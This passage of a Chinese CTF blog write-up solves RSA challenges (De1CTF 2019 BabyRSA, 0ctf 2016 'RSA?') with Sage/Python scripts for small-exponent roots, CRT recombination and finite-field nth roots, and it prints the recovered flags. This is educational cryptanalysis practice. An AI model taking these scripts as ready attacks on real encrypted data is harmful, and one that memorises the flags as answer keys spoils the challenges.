class="number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span></span><br><span class="line">ce2 =  <span class="number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span></span><br><span class="line">tmp =  <span class="number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span></span><br><span class="line">n  =  <span class="number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">pow</span>(e1,ee1,n)==ce1)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">pow</span>(e2+tmp,ee2,n)==ce2)</span><br><span class="line"></span><br><span class="line">e = <span class="number">46531</span></span><br><span class="line">n = <span class="number">16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603</span></span><br><span class="line">c = <span class="number">14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469</span></span><br><span class="line">hint=<span class="built_in">int</span>(binascii.hexlify(hint),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">assert</span>(q1p*q1q==n)</span><br><span class="line"><span class="keyword">assert</span>(q1p&lt;q1q)</span><br><span class="line"><span class="keyword">assert</span>(c==<span class="built_in">pow</span>(hint,e,n))</span><br><span class="line"></span><br><span class="line">flag=<span class="built_in">int</span>(binascii.hexlify(flag),<span class="number">16</span>)</span><br><span class="line">q1=q1p</span><br><span class="line">q2 =  <span class="number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span></span><br><span class="line">c1 =  <span class="number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span></span><br><span class="line">c2 =  <span class="number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span></span><br><span class="line"><span class="keyword">assert</span>(c1==<span class="built_in">pow</span>(flag,e1,p*q1))</span><br><span class="line"><span class="keyword">assert</span>(c2==<span class="built_in">pow</span>(flag,e2,p*q2))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>还是考这一类型的，无非就是多套了几层，想要求flag，就要知道e1，e2，q1p，p，想要求e1和e2，看这一步</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ee1 = <span class="number">42</span></span><br><span class="line">ee2 = <span class="number">3</span></span><br><span class="line">ce1 =  <span class="number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span></span><br><span class="line">ce2 =  <span class="number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span></span><br><span class="line">tmp =  <span class="number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span></span><br><span class="line">n  =  <span class="number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">pow</span>(e1,ee1,n)==ce1)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">pow</span>(e2+tmp,ee2,n)==ce2)</span><br></pre></td></tr></table></figure>

<p>e2加了一个padding，然后e=3可以用小指数解法，解出来减去tmp，得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e2 = <span class="number">381791429275130</span></span><br></pre></td></tr></table></figure>

<p>e1，和e2来个共模吧，我这里创造$e_1^{42}\ mod\ n$，相当于将ce1再做14次方模n，不知道可不可以</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e1 = <span class="number">184248803833368144507527482158254753456102436059792328559167056890008204564668583544316791778931084172047297608264133909324009314707553896235635211639233133607363861712312892361118629527362064961787009695248597106804395627805255359474989451093529378647565056831703141799794943273776382312947143190802046158174097138203112776712258154475273727098422965989978011736787396669332311941508114626948324330803438970382219225484642872929809644529306909820478119024559071046283253694826736959026215034831382526368076042757610908885320508141057588387594673572835966476324777431647490645334325605016262755417205130618921341925</span></span><br></pre></td></tr></table></figure>

<p>e1有这么大？接下来求flag那一层的n了</p>
<p>看第一个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = [<span class="number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423L</span>, <span class="number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421L</span>, <span class="number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303L</span>, <span class="number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791L</span>]</span><br><span class="line">c = [<span class="number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569L</span>, <span class="number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031L</span>, <span class="number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446L</span>, <span class="number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797L</span>]</span><br><span class="line">f = <span class="keyword">lambda</span> m, e, n, c:<span class="built_in">pow</span>(m, e, n) == c</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">sum</span>(<span class="built_in">map</span>(f, [p]*<span class="number">4</span>, [<span class="number">4</span>]*<span class="number">4</span>, n, c)) == <span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<p>e=4，各种方法试过了，不太行。麻了呀，瞟了一眼WP，这不是四个同余式吗？直接crt一梭子，最后别忘了开个方</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">109935857933867829728985398563235455481120300859311421762540858762721955038310117609456763338082237907005937380873151279351831600225270995344096532750271070807051984097524900957809427861441436796934012393707770012556604479065826879107677002380580866325868240270494148512743861326447181476633546419262340100453</span></span><br></pre></td></tr></table></figure>

<p>然后还有一个hint没求出来，对于那个n，factordb好分。求出来hint，哦，似曾相识的场景</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">orz...you.found.me.but.sorry.no.hint...keep.on.and.enjoy.it!</span><br></pre></td></tr></table></figure>

<p>但是没事，我们得到了q1p和q1q；接下来有两条思路，一是通过e1这条，因为求得e1很大，但是感觉e1求出来有问题，而且也不满足Wiener和boneh_durfee的两个条件，所以暂时没有思路；二是通过e2这条路，因为e2分解得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 * 5 * 7 * 89 * 643 * 1063 * 89659</span><br></pre></td></tr></table></figure>

<p>可以采取上述有限域开方的算法。经检验，将e2去掉70这个因子时，可以求出d，那么接下里只要求<br>$$<br>c=m^{70}\ mod\ n<br>$$<br>脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">p = <span class="number">109935857933867829728985398563235455481120300859311421762540858762721955038310117609456763338082237907005937380873151279351831600225270995344096532750271070807051984097524900957809427861441436796934012393707770012556604479065826879107677002380580866325868240270494148512743861326447181476633546419262340100453</span></span><br><span class="line">q = <span class="number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span></span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="number">8402626954844267019257189770827713712301490385606317353247232080660987949790497828588344121360142819597920380810717864248013962140671332736621869364023836966456292451288222487046361422315265333166292074987991328815414597857592078828853150603264183026137947540857054168476824895430715316542444821408894519825575271615168669882328867741339887771856046583079650726850387166574542239755300888839688437954412884568638812994672874904316709465173012849600200303575595413035671196508007653924536244993486097327630306519310746591152593249484415622597310848136958926253928859462221721082363622430393640647507855276596098618932</span></span><br><span class="line">e= <span class="number">14</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x ^e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res2 = f.roots()</span><br><span class="line">m=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        m.append(CRT(<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),p,q))</span><br><span class="line">e = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> C <span class="keyword">in</span> m:</span><br><span class="line">    R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">    f = x ^ e - C</span><br><span class="line">    f = f.monic()</span><br><span class="line">    res1 = f.roots()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">    f = x ^e - C</span><br><span class="line">    f = f.monic()</span><br><span class="line">    res2 = f.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">            M=CRT(<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),p,q)</span><br><span class="line">            flag = long_to_bytes(M)</span><br><span class="line">            <span class="keyword">if</span> flag.startswith(<span class="string">b&#x27;de1ctf&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(long_to_bytes(M))</span><br></pre></td></tr></table></figure>

<p>跑了有一会出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">de1ctf&#123;9b10a98b-71bb-4bdf-a6ff-f319943de21f&#125;</span><br></pre></td></tr></table></figure>

<p>最后我检查了下别的师傅的WP，发现e1这么做确实有问题，la佬也说了共模攻击，e之间要互素的</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210709095550289.png" alt="De1CTF2019-BabyRSA共模攻击"></p>
<p>正确的做法，我没想到竟然可以iroot，运用小指数的攻击，很快就可以出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e1 = <span class="number">15218928658178</span></span><br></pre></td></tr></table></figure>

<p>这不禁让我回忆了一下小指数rsa的攻击原理：<strong>还是爆破k ，所以e比较小还是都可以去试试的</strong></p>
<h3 id="0ctf-2016-RSA"><a href="#0ctf-2016-RSA" class="headerlink" title="0ctf 2016 - RSA?"></a>0ctf 2016 - RSA?</h3><blockquote>
<p>题目描述</p>
</blockquote>
<p>又是文件题型的rsa，让我祭出刚整理的OpenSSL</p>
<p>得到的数字如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">0x2CAA9C09DC1061E507E5B7F39DDE3455FCFE127A2C69B621C83FD9D3D3EAA3AAC42147CD7188C53</span></span><br><span class="line">e = <span class="number">3</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>n这么短，e=3，狂喜；n用factordb分解得到三个素数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">26440615366395242196516853423447</span></span><br><span class="line">q = <span class="number">27038194053540661979045656526063</span></span><br><span class="line">r = <span class="number">32581479300404876772405716877547</span></span><br></pre></td></tr></table></figure>

<p>然后由于上面有提示，是这一类型的题目，所以直接用有有限域开方了，稍微改了下脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">2485360255306619684345131431867350432205477625621366642887752720125176463993839766742234027524</span></span><br><span class="line">n = <span class="number">0x2CAA9C09DC1061E507E5B7F39DDE3455FCFE127A2C69B621C83FD9D3D3EAA3AAC42147CD7188C53</span></span><br><span class="line">p = <span class="number">26440615366395242196516853423447</span></span><br><span class="line">q = <span class="number">27038194053540661979045656526063</span></span><br><span class="line">r = <span class="number">32581479300404876772405716877547</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res2 = f.roots()</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(r)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res3 = f.roots()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> res3:</span><br><span class="line">            <span class="comment"># 普普通通中国剩余定理</span></span><br><span class="line">            m = crt([<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),<span class="built_in">int</span>(k[<span class="number">0</span>])],[p,q,r])</span><br><span class="line">            flag = long_to_bytes(m)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0ctf&#123;HahA!Thi5_1s_n0T_rSa~&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>最后赠送两道萌新赛的题目</p>
<h2 id="抱我"><a href="#抱我" class="headerlink" title="抱我"></a>抱我</h2><p>题目代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cstring = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#123;&#125;_0123456789&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;flag&#123;********&#125;&#x27;</span></span><br><span class="line">length = <span class="number">300</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>():</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length):</span><br><span class="line">        c = random.randint(<span class="number">0</span>, <span class="number">36</span>)</span><br><span class="line">        res += cstring[c]</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            c = random.randint(<span class="number">0</span>, <span class="built_in">len</span>(key) - <span class="number">1</span>)</span><br><span class="line">            res += key[c]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#qdfl33&#123;6&#123;6gs3afa6&#123;3&#125;agf&#123;&#125;aagdf&#125;6fl36d&#123;dfl&#123;6ay6gafddfg&#125;&#123;j3f&#125;&#125;6la&#123;3&#125;bfdf3&#125;gla&#125;65&#125;lg6g6dflf0&#123;dfgd3fdfgc&#123;g6a&#125;a3&#123;6&#125;mfa&#123;&#125;f&#125;f&#125;&#125;&#125;3363&#125;&#125;f6a6a7g&#123;a&#125;g66&#123;d3xgfffg&#125;a&#125;3&#125;_&#123;lad&#125;a33ga5fd33&#125;&#123;&#123;dl&#125;&#123;&#125;f&#123;3da&#125;g&#125;3egfal&#123;a3l&#125;3f33&#125;dfdda&#123;3sa&#123;d6g&#123;ff&#125;6vgl33d6g333h&#123;gd&#123;&#123;lg6ldg&#123;ad&#123;3333a6oalf6a&#123;33&#123;de3&#123;fa&#125;ggl&#123;abfd&#125;6&#125;6&#125;&#125;l33fa&#125;f&#123;&#123;3&#123;3fla&#125;a6&#125;af&#125;&#123;amg&#125;&#123;&#123;d&#125;&#125;a6gallfg36&#123;g3dh&#123;&#123;&#123;a&#123;lfg3&#123;sll6g6gfaggid6d&#123;3afl&#125;3rff3gfad3d&#125;1dlllff6&#125;6&#125;h3g66gla336b&#123;6d3gf&#125;f&#123;30d63l&#125;3dfl6a3llfgld3&#123;&#125;qg&#125;gf&#125;dg&#123;6l&#125;3gal&#125;agdl6&#123;lg&#123;g&#125;ddfaaealf&#123;f3llgge3ad3&#123;3adf&#123;c&#125;fllf6f&#125;3at&#123;aag&#125;a66d3&#125;ad&#123;dfg&#123;&#125;dlz6gld&#125;6&#123;3flxgf&#123;3g3ald&#125;3g&#125;g63f6ggf3&#125;gfd&#125;f3ga3efllf6&#125;363fu6366fdlggfx6&#125;6l3&#125;&#125;a&#123;afg&#123;&#123;&#125;&#125;3fdaluaa&#125;al&#123;dg3dpfga&#125;&#125;l&#125;d3l4afg&#125;f&#123;d&#123;lgcfgffglal&#125;dq6l&#125;fgflldavdad6&#125;df&#123;&#125;dw&#125;l6g&#125;&#125;&#123;l3gf6fdaa66aadt&#125;f6lg&#123;dg33h&#123;fa3d&#123;&#125;laao3l6aal&#123;lfdv&#123;3dlf6af36bddg&#125;3ggad3o&#125;&#123;&#125;3g3fgddyffd3lddgdd6&#123;gdfl&#123;&#123;la3ild&#125;dg&#123;g&#125;dgef&#123;a3&#123;d6dfgq3adll&#123;fdadt&#125;66fdflg&#123;3x&#123;l3ll&#125;3&#123;&#123;g4a3af6lag3gdaf66dadg6dfglaf66l3f&#123;2&#125;6&#123;afaf&#125;3l6all&#125;&#123;l&#125;lfdla6&#123;fgff&#123;&#125;g13dl&#123;a&#123;6&#123;l6rd6&#125;&#125;l3dgg3_f&#123;66gll&#123;f6a3d3dga6&#123;lg&#125;&#123;g&#125;d&#123;6&#123;d36lll3dd6&#123;3dg3afal&#125;d&#125;gff26&#125;l&#125;al&#125;&#125;&#123;a6&#125;g66gaaff&#125;0fga&#123;g6dfld&#123;&#123;&#125;fglf&#123;af&#125;iddf6g6&#125;l361&#123;ag&#125;&#123;&#123;dlfak&#125;&#123;d3fa&#123;6&#123;godgg&#123;l36a&#123;gmllgfa3fa&#123;&#125;f&#125;&#125;3&#123;a6&#123;a3&#123;nafg&#123;l3d6&#125;g2lf6&#123;gg&#125;&#123;g&#125;sg&#123;ga&#123;63g&#123;&#125;la6g&#123;g6&#123;&#123;63o6&#123;l&#125;&#123;3&#125;l3ag36&#123;af33g3dw6d33f3lfdan&#123;dddad&#123;&#123;6l6&#125;&#125;fad63lgd1ffaa&#125;g&#125;3flkg3d&#125;aalf3lbgf&#123;g&#125;f&#125;&#125;d3agf&#123;ld&#123;dl3l4fl&#123;&#123;3fla&#125;&#125;r3g&#125;&#123;&#125;gda&#123;&#125;_df3g&#125;fa36gq&#125;la&#123;f&#123;6l&#125;66fgdg&#125;6ag6feaal6all3&#123;d&#125;lfgl&#125;&#125;&#123;&#123;6lal&#125;gf&#125;&#125;gfgd4d&#123;g36daff&#125;l6fd63ag6&#125;f7&#125;l3&#123;&#123;d&#125;&#123;al6lff66gda&#125;f7dfaf6&#125;fd3ldfgfl36gf337a6al663afd&#123;dff&#125;6&#125;df&#123;lt&#125;66&#125;ag6a3&#123;na&#125;3la&#123;6daa&#125;63fgldf3ggcl6dd&#123;3fg&#123;&#125;&#125;gfgaf&#123;633lpfadalldgglg&#123;l&#125;&#123;6&#125;gf&#123;agf6&#123;3l3a366wa6l6&#125;fdla&#125;wfl&#125;33&#125;d&#123;6d6aa&#125;laldag&#125;bgaa3gff&#125;3db&#123;gd&#125;lfga3&#123;&#125;ffddd6&#125;&#123;la4&#125;3&#123;agdg3&#123;&#125;bf33adg3a632d&#125;66f&#125;dgd67&#125;&#123;333dfg&#125;&#125;mgg3all3l&#125;fd6dd3&#123;g&#125;&#123;&#125;&#125;v6&#125;a6f6lgd3nfgg6aff3a&#125;d3da&#123;l3ldldz&#123;&#125;&#123;&#125;g3&#125;6fdg6f&#123;gd&#123;g3adx&#123;gll6&#123;fg3dc63lf&#125;6dl&#123;d63f3g&#123;3adda5f3dgfla3&#123;6&#125;gd&#123;3&#123;d6dlldal6g66&#125;&#123;ddp&#125;lalafd&#125;d&#123;lgl&#125;g6g33agjg&#125;33dgf&#125;lg0adlda6gfdlx&#123;3g&#125;&#123;g3a&#123;a76&#125;gdf3la&#125;lh&#125;l&#123;l&#123;&#125;&#125;a6gm&#123;gdd&#123;agg&#125;6xfgg&#125;&#123;336&#125;d_a&#123;df3&#125;df33jgf&#125;6d3&#125;&#125;f&#125;h3l&#123;6ga6fll2&#125;dd&#123;l36d66&#125;ldafdlga3gbgd&#125;d6df&#125;ff1gf6a&#123;ll3a3w&#123;3g&#125;allfafldal&#125;aal&#125;dlra33l3f&#125;3dff&#123;6&#123;6&#125;f&#125;la&#125;lgf&#125;&#125;&#125;gd&#123;f3z3l3&#123;d3636dpl3fag3&#123;faa1&#123;3ga33l&#125;6ll6&#123;gg6&#125;ddf&#125;t6g&#125;&#123;gl6ggl&#123;d&#125;aafalf&#123;lw6a&#123;dad&#125;&#125;a3x&#123;ada&#123;fg6d&#125;a3g&#123;d&#123;fggdawdfal&#123;&#123;3dlfndl636&#125;36alv633ada6gf6hd&#123;3l66ddlfpglda&#125;&#123;g3fdogdfa3&#125;3g&#125;3k3d3gda33&#125;dvd&#125;laa&#123;fa&#123;a&#123;&#123;&#125;a&#125;36&#125;&#125;&#125;&#123;r6d6&#123;a6&#125;&#125;6&#123;0laa36gd&#123;36kf63a&#123;3&#125;gga4af6&#125;f3gfgf0lf&#123;6g&#125;&#123;&#123;6&#125;pafg6dg&#125;g6&#123;b&#125;3d36ad6d&#123;h6f3agff&#125;63p&#125;&#123;l3ag3&#125;lf1f3dgd&#123;66a37&#125;&#125;&#125;d6gglaftaf3l6a3&#123;&#123;a7&#123;lgd3d&#125;fl6tlfl663lgg3wa&#125;33gl&#125;d&#123;3i6aaagl6&#123;&#123;&#125;n3gd&#125;l3l6&#125;l7a&#123;gf&#123;a&#125;l&#125;f3al&#123;alg63fln&#123;&#123;dd&#125;3l&#123;ll1&#125;&#123;3g&#125;6&#123;6&#125;&#123;u63&#123;f3&#123;g6lgf&#123;3d&#125;&#123;636&#125;&#123;u3&#125;&#123;f6d&#123;&#123;d3lg&#123;3l6aldf&#123;i&#123;f366&#123;f3l&#123;eg&#123;d&#123;gll&#123;3dhgdgfgaf&#123;&#125;&#125;g&#125;&#123;lg3&#123;a&#123;flm&#125;fa3ldf&#123;d32fagllf&#123;&#123;66q363&#125;dl66gg2fa6af6d6g37lffl&#123;d&#123;3lltgl33&#125;&#125;&#123;&#125;d3o&#123;lfld3d&#123;&#125;a6a663a66&#123;fabfd6ld333g3rafa&#125;&#125;fddfgt&#123;ggad3ag&#125;lr63af6lgg&#125;gy&#123;6&#123;&#123;6&#125;6dd626&#123;gl6a&#123;ad3b3df&#125;alf3afdaf66ll&#125;lf6jd&#125;3&#123;6dldfgg&#125;f3lg63l&#123;lr3ff3l&#123;gafaa&#125;f&#125;agl6l33xglfggg&#123;&#123;&#123;fq66&#125;g6lfa3&#123;736lllflalglf&#125;&#123;&#125;gf&#123;aggdg3&#123;a&#125;&#125;da&#123;fp6fglla3l&#125;65gf36&#123;l6dl&#125;g&#125;f&#123;la6&#123;l&#123;fpf&#123;&#125;63&#123;f6gdfaalf6&#123;dffgdgf&#123;lgaf&#123;f&#123;56&#125;g6af63l6a&#125;a&#125;&#123;lfa&#123;3gblda&#125;l&#125;&#123;fl&#123;s&#123;g&#125;&#125;6&#123;g6la56g6g3&#123;f&#125;ddfaa&#123;l&#125;dg6g&#125;0glda6&#123;6d&#125;ff&#125;f&#123;6laadd6zaag&#123;l3l&#125;6dc&#12